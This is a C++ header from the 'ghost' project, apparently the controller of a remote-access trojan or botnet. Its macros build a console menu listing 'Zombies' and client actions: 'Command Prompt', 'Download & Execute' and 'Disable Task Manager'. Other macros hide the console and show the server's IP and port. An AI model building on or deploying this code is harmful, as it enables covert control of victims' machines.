/*
	@title
		ghost
	@author
		AHXR (https://github.com/AHXR)
	@copyright
		2018

	ghost is free software: you can redistribute it and/or modify
	it under the terms of the GNU General Public License as published by
	the Free Software Foundation, either version 3 of the License, or
	(at your option) any later version.

	ghost is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.

	You should have received a copy of the GNU General Public License
	along with ghost.  If not, see <http://www.gnu.org/licenses/>.
*/
//=======================================================
#define					DEFAULT_BUFF		19056
#define					AHXRLOGGER_PLUGIN // https://github.com/AHXR/ahxrlogger

#define					SHOW_CONSOLE()		{ AllocConsole(); LOG("%s\n\n", c_ascii); b_hidden = false; }
#define					HIDE_CONSOLE()		{ FreeConsole(); b_hidden = true; }
#define					SHOW_MENU()			{ LOG("\nSelect an option: \
\n1) Zombies \
\n2) Configuration \
\n3) Refresh \
\n4) Minimize \
\n5) Exit"); cin >> s_option; \
											}
#define					SHOW_CLIENT_OPT()	{ LOG("1) Command Prompt\
\n2) Download & Execute\
\n3) Disable Task Manager"); \
											}
#define					SHOW_CONFIG()		{	LOG("[COLOR:BROWN]IP: %s", real_ip().c_str()); \
												LOG("[COLOR:BROWN]Port: %s", c_port.c_str()); \
												LOG("-----------------------"); \
											}
#define					SHOW_GHOST()		{ system("CLS"); LOG("%s\n\n", c_ascii); }
#define					GO_BACK()			{ LOG("[COLOR:GREEN]0) [Back to Main Menu]"); }

#define					GHOST_CONFIG		"ghost.conf"
#define					TIMEOUT_WARNING		100 // Default Warning
#define					TIMEOUT_EXIT		200 // Default Timeout